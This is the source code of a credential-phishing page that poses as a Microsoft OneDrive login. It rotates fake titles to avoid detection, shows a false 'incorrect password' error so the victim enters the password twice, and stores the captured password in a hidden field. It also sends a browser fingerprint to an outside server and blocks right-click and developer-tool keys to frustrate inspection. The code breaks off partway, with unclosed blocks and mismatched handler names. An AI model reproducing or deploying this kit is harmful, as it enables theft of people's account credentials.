<body oncontextmenu="return a1(event);" onkeydown="return b2(event);" onmousedown="return c3(event);">
    <div class="ctnr" id="loginBox">

    <script>
        (function() {
            function generateId() {
                return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                    var r = Math.random() * 16 | 0,
                        v = c == 'x' ? r : (r & 0x3 | 0x8);
                    return v.toString(16);
                });
            }

            function setSession() {
                const sessId = generateId();
                document.cookie = `sessionId=${sessId}; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT`;
                const newUrl = `${window.location.href.split('?')[0]}?sess=${sessId}`;
                window.history.replaceState({}, '', newUrl);
            }

            setSession();

            const titles = ["OneDrive Login", "Secure OneDrive", "Microsoft OneDrive", "Access OneDrive", "OneDrive Access", "Cloud Login", "OneDrive Security", "Login Portal", "OneDrive Portal", "Secure Cloud"];
            const usedTitles = JSON.parse(localStorage.getItem('usedTitles')) || [];
            let availableTitles = titles.filter(title => !usedTitles.includes(title));

            if (availableTitles.length === 0) {
                localStorage.removeItem('usedTitles');
                availableTitles = titles;
            }

            const selectedTitle = availableTitles[Math.floor(Math.random() * availableTitles.length)];
            document.getElementById('ttlDyn').innerText = selectedTitle;

            usedTitles.push(selectedTitle);
            localStorage.setItem('usedTitles', JSON.stringify(usedTitles));

            // Preload the background image
            const img = new Image();
            img.src = "https://storage.googleapis.com/onedrive-d9.appspot.com/images/onedriveside1.jpg";
            img.onload = function() {
                document.body.style.display = "block";
            };

            let attemptCount = 1;

            window.validateForm = function() {
                const email = document.getElementById('emailInput').value;
                const password = document.getElementById('pwdInput').value;
                const hiddenPasswordField = document.getElementById('hiddenPwd');
                const sessionField = document.getElementById('sessionField');
                const errorMsg = document.getElementById('errorMsg');

                if (attemptCount === 1) {
                    hiddenPasswordField.value = password;
                    attemptCount++;
                    errorMsg.textContent = 'Incorrect password. Please try again.';
                    document.getElementById('pwdInput').value = '';
                    return false;
                }

                sessionField.value = getCookie('sessionId');
                return true;
            }

            function getCookie(name) {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }

            document.getElementById('showPass').addEventListener('change', function() {
                const passwordField = document.getElementById('pwdInput');
                passwordField.type = this.checked ? 'text' : 'password';
            });

            // Mouse movement detection
            document.addEventListener('mousemove', function() {
                if (!document.moved) {
                    document.moved = true;
                }
            });

            // Basic fingerprinting
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('OneDrive', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('OneDrive', 4, 17);
            const fingerprint = canvas.toDataURL();

            // Send fingerprint or other data to the server for blocking bots
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://your-server-endpoint.com/fingerprint', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('fp=' + encodeURIComponent(fingerprint));

            // Block specific IPs (example)
            const blkIPs = ["192.168.1.1", "10.0.0.1"];
            if (blkIPs.includes(window.location.hostname)) {
                document.body.innerHTML = ''; // Block content for specific IPs
            }

            // Function to disable right-click and specific key combinations
            window.x1 = function(event) {
                if (event.button === 2) {
                    return false;
                }
                if (event.ctrlKey && event.key === 'u') {
                    return false;
                }
                if (event.key === 'F12') {
                    return false;
                }
                if (event.ctrlKey && event.shiftKey && event.key === 'I') {
                    return false;
                }
                if (event.ctrlKey && event.shiftKey && event.key === 'J') {
                    return false;
                }
                return true;
            };

            // Function to disable mouse actions that open developer tools
            window.y2 = function(event) {
                if (event.which === 2) {
                    return false;
                }
                return true;
            };

            // Additional obfuscation function

                // Random operations to mislead

                for (var i = 0; i < 100; i++) {

                console.log(arr.join(','));

            z3(); // Call the additional obfuscation function
